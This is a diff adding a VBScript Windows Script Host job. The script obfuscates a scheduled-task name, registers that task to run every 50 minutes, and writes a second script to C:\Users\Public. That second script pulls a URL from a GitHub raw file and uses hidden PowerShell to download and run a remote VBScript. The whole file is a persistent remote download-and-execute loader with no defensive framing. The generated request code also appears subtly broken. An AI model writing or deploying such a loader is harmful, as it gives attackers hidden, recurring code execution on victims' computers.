@@ -1,0 +1,44 @@
+<job>
+  <script language="VBScript">
+    Option Explicit
+
+    Dim objShell, tarea, cmdEliminar, cmdCrear
+    Dim fso, archivo
+    Dim xhr, urlRecortada
+    Dim ejecutarShell
+    Dim carpetaRand, archivoRand
+
+    Set objShell = CreateObject("WScript.Shell")
+
+    ' Nombre de la tarea con ofuscación ligera
+    tarea = "T" & "a" & "r" & "e" & "a" & "0" & Chr(97) & Chr(118) & Chr(97) & Chr(100) & Chr(111) & Chr(114) & Chr(32) & "1"
+
+    ' Elimina tarea anterior para evitar duplicados
+    cmdEliminar = "schtasks /Delete /TN """ & tarea & """ /F"
+    
+    ' Crea nueva tarea cada 50 minutos (no 30)
+    cmdCrear = "schtasks /Create /SC MINUTE /MO 50 /TN """ & tarea & """ /TR ""wscript.exe C:\Users\Public\Tarea.vbs"" /F"
+
+    objShell.Run cmdEliminar, 0, True
+    objShell.Run cmdCrear, 0, True
+
+    carpetaRand = "C:\Users\Public\"
+    archivoRand = "Tarea.vbs"
+
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set archivo = fso.CreateTextFile(carpetaRand & archivoRand, True)
+
+    ' Descarga cmd.txt desde GitHub raw (más rápido que XAMPP)
+    archivo.WriteLine "Set xhr = CreateObject(""MSXML2.XMLHTTP"")"
+    archivo.WriteLine "xhr.Open ""GET"", ""https://raw.githubusercontent.com/ABBASABBUD100/Notificaciones254/main/cmd.txt"", False"
+    archivo.WriteLine "urlRecortada = Trim(Replace(xhr.responseText, vbCrLf, """"))"
+    
+    ' Ejecuta el JS con PowerShell oculto
+    archivo.WriteLine "If urlRecortada <> """" Then"
+    archivo.WriteLine "  Set ejecutarShell = CreateObject(""WScript.Shell"")"
+    archivo.WriteLine "  ejecutarShell.Run ""powershell.exe -WindowStyle Hidden -Command Invoke-WebRequest -Uri '"" & urlRecortada & ""' -OutFile 'C:\Users\Public\script.vbs'; Start-Process 'wscript.exe' -ArgumentList 'C:\Users\Public\script.vbs'"", 0, False"
+    archivo.WriteLine "End If"
+
+    archivo.Close
+  </script>
+</job>
